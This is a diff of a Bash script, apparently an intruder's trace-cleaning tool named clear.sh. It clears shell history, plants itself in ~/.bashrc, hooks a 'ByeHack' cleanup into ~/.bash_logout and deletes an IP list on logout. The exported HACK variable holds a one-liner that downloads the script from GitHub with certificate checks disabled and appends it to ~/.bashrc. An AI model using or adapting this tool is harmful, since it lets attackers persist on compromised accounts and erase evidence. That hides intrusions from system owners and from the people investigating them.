@@ -1,6 +1,4 @@
-if [ -f ~/.bashrc ];then 
-  cp ~/.bashrc /tmp/_bash;
-else
+if [ ! -f ~/.bashrc ];then 
   touch /tmp/_bash;
 fi
 
@@ -10,7 +8,6 @@ else
   touch /tmp/_bash_out;
 fi
 
-cat clear.sh >> ~/.bashrc
 echo "ByeHack; " >> ~/.bash_logout;
 history -c ;
 
@@ -91,7 +88,11 @@ function CL {
 
 function ByeHack {
   mv /tmp/_bash ~/.bashrc
-  mv /tmp/_bash_out ~/.bash_logout
+  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
+      rm ~/.bash_logout;
+  else
+      mv /tmp/_bash_out ~/.bash_logout;
+  fi
   CL
   _resume;
   rm $my_ips;
@@ -99,4 +100,4 @@ function ByeHack {
 }
 
 
-export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; echo ok ; bash"
+export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; cp ~/.bashrc /tmp/_bash; cat clear.sh >> ~/.bashrc ; rm clear.sh ; bash"
